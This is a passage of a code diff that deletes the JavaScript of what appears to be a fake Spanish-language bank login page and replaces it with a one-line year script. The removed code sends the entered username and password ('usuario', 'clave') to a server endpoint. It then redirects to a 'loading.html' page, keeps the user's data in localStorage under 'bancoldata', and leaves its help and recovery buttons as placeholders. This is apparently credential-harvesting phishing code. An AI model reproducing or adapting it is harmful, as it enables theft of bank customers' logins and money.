-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        usuario: bancoldata.usuario,
-                        clave: bancoldata.clave,
-                        transactionId
-                    })
-                });
-
-                const json = await res.json();
-
-                if (json.ok) {
-                    loginButton.innerHTML = "✔ Correcto";
-                    loginButton.style.background = "#00a651";
-                    loginButton.style.color = "#fff";
-                    setTimeout(() => (location.href = "loading.html"), 700);
-                } else {
-                    loginButton.innerHTML = "Ingresar";
-                    loginButton.classList.remove('loading');
-                    validateForm();
-                    alert("Error: " + json.error);
-                }
-            } catch (error) {
-                console.error('Error:', error);
-                showToast('Error de conexión. Intenta de nuevo.', 'error');
-                loginButton.innerHTML = "Ingresar";
-                loginButton.classList.remove('loading');
-                validateForm();
-            }
-        }
-
-        loginButton.addEventListener('click', performLogin);
-
-        // "¿La olvidaste?"
-        document.getElementById('forgotPassword').addEventListener('click', (e) => {
-            e.preventDefault();
-            showToast('Recuperación de contraseña próximamente');
-        });
-
-        // ====================
-        // SELECT DESLIZABLE
-        // ====================
-        const openSelect = document.getElementById('openSelect');
-        const modal = document.getElementById('modal');
-        const overlay = document.getElementById('overlay');
-        const cancelSelect = document.getElementById('cancelSelect');
-        const options = document.querySelectorAll('.option');
-
-        function openModal() {
-            overlay.style.display = 'block';
-            openSelect.classList.add('active');
-            setTimeout(() => {
-                modal.classList.add('show');
-            }, 10);
-        }
-
-        function closeModal() {
-            modal.classList.remove('show');
-            openSelect.classList.remove('active');
-            setTimeout(() => {
-                overlay.style.display = 'none';
-            }, 350);
-        }
-
-        openSelect.addEventListener('click', openModal);
-        overlay.addEventListener('click', closeModal);
-        cancelSelect.addEventListener('click', closeModal);
-
-        options.forEach(opt => {
-            opt.addEventListener('click', () => {
-                document.querySelector('.option.selected')?.classList.remove('selected');
-                opt.classList.add('selected');
-                openSelect.textContent = opt.dataset.value;
-                closeModal();
-                
-                openSelect.style.borderColor = '#00a651';
-                setTimeout(() => {
-                    openSelect.style.borderColor = '';
-                }, 1000);
-            });
-        });
-
-        // ====================
-        // CARGAR DATOS GUARDADOS
-        // ====================
-        function loadSavedData() {
-            try {
-                const savedData = JSON.parse(localStorage.getItem('bancoldata') || '{}');
-                
-                if (savedData.tipoDocumento) {
-                    openSelect.textContent = savedData.tipoDocumento;
-                    options.forEach(opt => {
-                        opt.classList.remove('selected');
-                        if (opt.dataset.value === savedData.tipoDocumento) {
-                            opt.classList.add('selected');
-                        }
-                    });
-                }
-                
-                if (savedData.usuario) {
-                    userInput.value = savedData.usuario;
-                }
-                
-                if (savedData.rememberDocument) {
-                    document.getElementById('rememberDoc').checked = true;
-                }
-
-                validateForm();
-                
-            } catch (e) {
-                console.error('Error al cargar datos guardados:', e);
-            }
-        }
-
-        // ====================
-        // SECCIÓN DE AYUDA
-        // ====================
-        document.getElementById('solicitarProductos').addEventListener('click', () => {
-            showToast('Redirigiendo a solicitud de productos...');
-        });
-
-        document.getElementById('contactanos').addEventListener('click', () => {
-            showToast('Redirigiendo a página de contacto...');
-        });
-
-        document.getElementById('pagosBtn').addEventListener('click', () => {
-            showToast('Redirigiendo a inscripción de pagos...');
-        });
-
-        // Mejorar experiencia en móviles
-        document.addEventListener('touchstart', () => {}, { passive: true });
-        
-        // Prevenir zoom en input number en iOS
-        userInput.addEventListener('focus', () => {
-            if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
-                userInput.style.fontSize = '16px';
-            }
-        });
-        
-        userInput.addEventListener('blur', () => {
-            if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
-                userInput.style.fontSize = '15px';
-            }
-        });
-    </script>
+<script>
+  document.getElementById("year").textContent = new Date().getFullYear();
+</script>
 </body>
 </html>
